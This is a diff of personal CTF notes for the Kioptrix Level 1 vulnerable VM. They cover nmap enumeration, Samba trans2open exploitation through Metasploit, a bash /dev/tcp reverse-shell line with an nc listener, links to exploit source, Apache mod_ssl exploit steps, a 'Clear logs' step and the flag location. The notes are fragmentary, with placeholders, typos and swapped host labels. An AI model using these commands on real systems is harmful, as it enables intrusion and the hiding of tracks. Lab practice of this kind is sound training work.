@@ -1,7 +1,7 @@
 0. Get VM's IP
 
 1. Enumenation
-nmap -p- -sS -A 
+nmap -p- -sS -A <ip>
 nmap -p- -sV <ip>
 #home 192.168.75.129
 22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
@@ -12,16 +12,38 @@ nmap -p- -sV <ip>
 1024/tcp open  status      1 (RPC #100024)
 
 2. Get root 
-2.1. Exploration SMB
+2.1. Exploitation SMB
 #get smb version
-#need to do
+#<need to do>
 
 #search exploit 
 Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
 
 #run exploit
 
-2.2. Exploraion Apache
+#to coonect back from victim maschine
+bash -i >&/dev/tcp/<ip>/4444 0>&1
+#to get coonnect on host machine
+nc -nlvp 4444
+
+2.1.2 Alternative exploitation with Metasploit
+#use metasploit
+search 2003-0201
+#2003-0201 is a CVE to vuln Samba 2.2.1a
+use /exploit/linux/samba/trans2open
+set rhost <ip_host>
+set payload linux/x86/shell_reverse_tcp
+set lhost <ip_victim>
+exploit
+
+2.1.2 Alternative esploitation with another exploit
+#<need to do>
+http://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub.html
+downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c
+
+
+
+2.2. Exploitation Apache
 #get apache version
 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 
@@ -42,3 +64,11 @@ apt-get install libssl1.0-dev
 const unsigned char *p, *end;
 5. compile code
 
+3. Clear logs
+https://blog.g0tmi1k.com/2011/02/kioptrix-level-1-modssl/
+https://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c
+
+
+
+4. Get flag
+/var/mail/root
